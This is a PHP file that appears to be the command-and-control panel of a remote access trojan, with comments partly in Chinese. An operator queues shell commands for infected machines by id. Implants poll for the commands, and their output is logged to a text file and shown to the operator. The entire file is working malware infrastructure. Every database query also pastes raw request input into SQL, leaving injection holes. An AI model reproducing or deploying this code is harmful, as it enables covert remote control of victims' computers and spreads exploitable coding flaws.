<?php
require("config.php");
$mysqli = new mysqli("localhost",$username,$password,"yourdbname");
if(mysqli_connect_error())
{
	printf("cant connect to the database：%s\n",mysqli_connect_error());
	exit();
}

//to save the cmd that hacker input and insert the cmd into database
if(isset($_SESSION["admin"]))
{
	echo '
	<div id="console">
	<form action="cmd.php" method="post">
	<p>command: <input type="text" name="cmd" />&nbspid:<input type="number" name="id" />
	<input type="submit" value="Send the command">
	</p>
	</form></div>';

	echo '<article id="output">';
	echo '<p align="center">result</p>';
	echo '<pre>';
	readfile("output.txt");
	echo '</pre>';
	echo '<a href="cmd.php?do=clear">clear(attention！)</a>';
	echo '</article>';
}
	
if(($_POST["id"] != NULL) && ($_POST["cmd"] != NULL))
{
	$idin = $_POST["id"];
	$cmd = $_POST["cmd"];
	$mysqli->query("UPDATE pwrat SET cmd='$cmd' WHERE id='$idin'");
	header("location:index.php?do=cmd");
}
	
//当server将id以GET方式提交到Web时，将id放到数据库中查询，并将命令返回给server	
if ($_GET["id"] != NULL)
{
	$idout = $_GET["id"];
	$result = $mysqli->query("SELECT cmd FROM pwrat WHERE id = '$idout'");
	$row = $result->fetch_assoc();
	echo $row["cmd"];
	$time = date("Y-n-j H:i:s");
	$mysqli->query("UPDATE pwrat SET lastime = '$time' WHERE id = '$idout'");	//更新最新在线时间
	$mysqli->query("UPDATE pwrat SET cmd = 'do_nothing' WHERE id = '$idout'"); //未避免重复执行命令，每取一次命令就设为“do_nothing”
	$result->close();
}

//将命令回显写入文件
if($_POST["output"]!=NULL)
{
	$output = $_POST["output"];
	$handle1 = fopen("output.txt","a+");
	fwrite($handle1,$output."<br><br>");
	fclose($handle1);
}
//清除回显
if($_GET["do"] == "clear")
{
	file_put_contents("output.txt","");
	header("location:index.php?do=cmd");
}

$mysqli->close();

?>